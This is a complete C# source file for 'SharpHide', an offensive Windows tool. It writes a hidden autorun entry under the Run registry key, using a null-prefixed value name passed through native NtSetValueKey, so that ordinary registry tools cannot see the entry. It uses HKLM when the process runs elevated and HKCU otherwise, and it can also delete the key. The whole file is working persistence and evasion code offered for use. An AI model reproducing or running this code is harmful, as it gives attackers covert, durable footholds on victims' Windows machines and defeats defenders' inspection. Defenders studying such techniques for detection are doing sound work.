using System;
using System.Security.Principal;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace SharpHide
{
    class Program
    {
        static void Usage()
        {
            Console.WriteLine("\r\n[+] SharpHide");
            Console.WriteLine("[+] Create hidden registry (Run) key:\r\n    SharpHide.exe action=create keyvalue=\"C:\\Windows\\Temp\\Bla.exe arg1 arg2\"");
            Console.WriteLine("[+] Delete hidden registry (Run) key:\r\n    SharpHide.exe action=delete");
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING : IDisposable
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr buffer;

            public UNICODE_STRING(string s)
            {
                Length = (ushort)(s.Length * 2);
                MaximumLength = (ushort)(Length + 2);
                buffer = Marshal.StringToHGlobalUni(s);
            }

            public void Dispose()
            {
                Marshal.FreeHGlobal(buffer);
                buffer = IntPtr.Zero;
            }

            public override string ToString()
            {
                return Marshal.PtrToStringUni(buffer);
            }
        }

        enum RegistryKeyType
        {
            REG_NONE = 0,
            REG_SZ = 1,
            REG_EXPAND_SZ = 2,
            REG_BINARY = 3,
            REG_DWORD = 4,
            REG_DWORD_LITTLE_ENDIAN = 4,
            REG_DWORD_BIG_ENDIAN = 5,
            REG_LINK = 6,
            REG_MULTI_SZ = 7
        }

        public static UIntPtr HKEY_CURRENT_USER = (UIntPtr)0x80000001;
        public static UIntPtr HKEY_LOCAL_MACHINE = (UIntPtr)0x80000002;
        public static int KEY_QUERY_VALUE = 0x0001;
        public static int KEY_SET_VALUE = 0x0002;
        public static int KEY_CREATE_SUB_KEY = 0x0004;
        public static int KEY_ENUMERATE_SUB_KEYS = 0x0008;
        public static int KEY_WOW64_64KEY = 0x0100;
        public static int KEY_WOW64_32KEY = 0x0200;

        [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
        public static extern uint RegOpenKeyEx(
            UIntPtr hKey,
            string subKey,
            int ulOptions,
            int samDesired,
            out UIntPtr KeyHandle
            );

        [DllImport("ntdll.dll", CharSet = CharSet.Unicode, CallingConvention = CallingConvention.StdCall)]
        static extern uint NtSetValueKey(
            UIntPtr KeyHandle,
            IntPtr ValueName,
            int TitleIndex,
            RegistryKeyType Type,
            IntPtr Data,
            int DataSize
            );

        [DllImport("ntdll.dll", CharSet = CharSet.Unicode, CallingConvention = CallingConvention.StdCall)]
        static extern uint NtDeleteValueKey(
            UIntPtr KeyHandle,
            IntPtr ValueName
            );

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern int RegCloseKey(
            UIntPtr KeyHandle
            );

        static IntPtr StructureToPtr(object obj)
        {
            IntPtr ptr = Marshal.AllocHGlobal(Marshal.SizeOf(obj));
            Marshal.StructureToPtr(obj, ptr, false);
            return ptr;
        }

        public static bool IsElevated
        {
            get
            {
                return WindowsIdentity.GetCurrent().Owner
                  .IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
            }
        }

        static void Main(string[] args)
        {
            if (args.Length < 1) {
                Usage();
                return;
            }

            var arguments = new Dictionary<string, string>();
            foreach (string argument in args)
            {
                int idx = argument.IndexOf('=');
                if (idx > 0)
                    arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
            }

            if (!arguments.ContainsKey("action")) {
                Usage();
                return;
            }

            if ((arguments["action"] != "create") && (arguments["action"] != "delete")) {
                Usage();
                return;
            }

            if ((arguments["action"] == "create") && (!arguments.ContainsKey("keyvalue"))) {
                Usage();
                return;
            }

            UIntPtr regKeyHandle = UIntPtr.Zero;
            string runKeyPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
            string runKeyPathTrick = "\0\0SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

            bool IsSystem;
            using (var identity = System.Security.Principal.WindowsIdentity.GetCurrent())
            {
                IsSystem = identity.IsSystem;
            }

            uint Status = 0xc0000000;
            uint STATUS_SUCCESS = 0x00000000;

            if (IsSystem || IsElevated)
            {
                Console.WriteLine("\n[+] SharpHide running as elevated user:\r\n    Using HKLM\\{0}", runKeyPath);
                Status = RegOpenKeyEx(HKEY_LOCAL_MACHINE, runKeyPath, 0, KEY_SET_VALUE, out regKeyHandle);
            }
            else
            {
                Console.WriteLine("\n[+] SharpHide running as normal user:\r\n    Using HKCU\\{0}", runKeyPath);
                Status = RegOpenKeyEx(HKEY_CURRENT_USER, runKeyPath, 0, KEY_SET_VALUE, out regKeyHandle);
            }

            UNICODE_STRING ValueName = new UNICODE_STRING(runKeyPathTrick)
            {
                Length = 2 * 11,
                MaximumLength = 0
            };
            IntPtr ValueNamePtr = StructureToPtr(ValueName);

            if (arguments["action"] == "delete") {
                Status = NtDeleteValueKey(regKeyHandle, ValueNamePtr);
                if (Status.Equals(STATUS_SUCCESS)) {
                    Console.WriteLine("[+] Key successfully deleted.");
                }
                else {
                    Console.WriteLine("[!] Failed to delete registry key.");
                }
            }
            else {
                UNICODE_STRING ValueData = new UNICODE_STRING(arguments["keyvalue"]);
                Status = NtSetValueKey(regKeyHandle, ValueNamePtr, 0, RegistryKeyType.REG_SZ, ValueData.buffer, ValueData.MaximumLength);
                if (Status.Equals(STATUS_SUCCESS)) {
                    Console.WriteLine("[+] Key successfully created.");
                }
                else {
                    Console.WriteLine("[!] Failed to create registry key.");
                }
            }

            RegCloseKey(regKeyHandle);
            return;
        }
    }
}
